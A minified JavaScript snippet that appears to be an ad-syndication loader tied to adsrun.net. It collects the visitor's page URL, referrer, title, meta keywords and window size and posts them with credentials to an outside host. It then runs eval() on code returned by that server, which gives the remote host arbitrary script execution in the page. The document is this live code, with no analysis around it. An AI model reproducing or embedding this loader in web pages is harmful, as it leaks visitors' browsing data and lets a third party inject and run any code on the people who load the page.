;(function(a,b,h,k){function ajax(b,a,c){var d=null;try{d=new XMLHttpRequest}catch(e){try{d=new ActiveXObject("Microsoft.XMLHTTP")}catch(f){}}d.onreadystatechange=function(){4==d.readyState&&c&&c(d.responseText)};d.open(a?"POST":"GET",b,!0);d.withCredentials=!0;a?(d.setRequestHeader("Content-Type","application/json; charset=UTF-8"),d.send(JSON.stringify(a))):d.send()}for(var e=b.documentElement,c=b.body,m=a.innerWidth||e.clientWidth||c.clientWidth,e=a.innerHeight||e.clientHeight||c.clientHeight,c=document.querySelectorAll("meta"),
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://in.api.adsrun.net/post",{"name":"synd1","time":1460051212.2368,"user":"1041104.7001814","subid":1041104,"geo":"IN","hash":"18b4a9c7ad430644988e1471ad31f510"});